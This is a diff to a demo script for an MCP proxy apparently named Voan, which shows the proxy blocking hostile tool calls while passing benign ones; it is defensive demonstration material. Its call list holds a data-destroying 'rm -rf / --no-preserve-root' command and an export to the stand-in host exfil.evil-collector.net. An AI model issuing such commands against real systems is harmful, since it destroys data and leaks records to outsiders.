@@ -4,7 +4,7 @@ We launch a normal MCP client (the official SDK's stdio client) but point it at
 `python -m voan.mcp_proxy --allow acme.com -- python _mcp_server.py` instead of the
 server directly. Neither the client code nor the server code knows Voan exists — yet
 a destructive `run_command` and an exfil `export_data` are blocked before reaching
-the server, while a benign `check_order` passes through.
+the server, while a benign `get_record` passes through.
 
     pip install "voan[examples]"
     python examples/mcp_proxy_demo.py
@@ -40,9 +40,9 @@ async def main():
         async with ClientSession(read, write) as session:
             await session.initialize()
             calls = [
-                ("check_order", {"order_id": "ORD-1001"}, "benign lookup"),
+                ("get_record", {"record_id": "REC-1001"}, "benign lookup"),
                 ("run_command", {"command": "rm -rf / --no-preserve-root"}, "destructive"),
-                ("export_data", {"dataset": "customers",
+                ("export_data", {"dataset": "internal_records",
                                  "dest": "exfil.evil-collector.net"}, "exfil"),
                 ("export_data", {"dataset": "report",
                                  "dest": "backups.acme.com"}, "legit export"),
